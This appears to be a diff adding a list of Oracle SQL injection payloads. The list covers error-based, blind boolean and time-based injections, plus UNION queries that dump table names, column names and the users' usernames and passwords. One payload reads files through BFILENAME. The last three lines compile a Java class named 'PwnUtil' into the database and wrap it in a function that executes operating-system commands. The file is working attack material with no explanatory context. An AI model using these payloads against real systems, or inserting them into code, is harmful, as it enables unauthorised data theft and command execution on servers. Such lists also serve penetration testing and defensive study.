@@ -1,0 +1,17 @@
+' AND 1=UTL_INADDR.GET_HOST_ADDRESS((SELECT banner FROM v$version WHERE ROWNUM=1))-- -
+' AND 1=CTXSYS.DRITHSX.SN('foo',(SELECT banner FROM v$version WHERE ROWNUM=1))-- -
+' AND 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH((SELECT banner FROM v$version WHERE ROWNUM=1),'foo','bar')-- -
+' AND (SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END) = 1 FROM dual-- -
+' AND (SELECT CASE WHEN (ASCII(SUBSTR((SELECT banner FROM v$version WHERE ROWNUM=1),1,1))=79) THEN 1 ELSE 0 END) = 1 FROM dual-- -
+' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -
+' AND CASE WHEN (1=1) THEN DBMS_LOCK.SLEEP(5) ELSE NULL END IS NULL-- -
+' UNION SELECT 'abc','def' FROM dual-- -
+' UNION SELECT table_name,NULL FROM all_tables-- -
+' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS'-- -
+' UNION SELECT username,password FROM users-- -
+'/**/UNION/**/SELECT/**/'abc','def'/**/FROM/**/dual-- -
+' UNION SELECT CHR(97)||CHR(98)||CHR(99), NULL FROM dual-- -
+' UNION SELECT UTL_RAW.CAST_TO_VARCHAR2(DBMS_LOB.SUBSTR(BFILENAME(''DIR'',''file.txt''), 4000, 1)), NULL FROM dual-- -
+BEGIN  EXECUTE IMMEDIATE 'CREATE OR REPLACE AND COMPILE JAVA SOURCE NAMED "PwnUtil" AS import java.io.*; public class PwnUtil{ public static String runCmd(String args){ try{ BufferedReader myReader = new BufferedReader(new InputStreamReader(Runtime.getRuntime().exec(args).getInputStream()));String stemp, str = "";while ((stemp = myReader.readLine()) != null) str += stemp + "\n";myReader.close();return str;} catch (Exception e){ return e.toString();}}}';  END; /
+BEGIN  EXECUTE IMMEDIATE 'CREATE OR REPLACE FUNCTION PwnUtilFunc(p_cmd IN VARCHAR2) RETURN VARCHAR2 AS LANGUAGE JAVA NAME ''PwnUtil.runCmd(java.lang.String) return String'';';  END; /
+SELECT PwnUtilFunc('id') FROM dual;
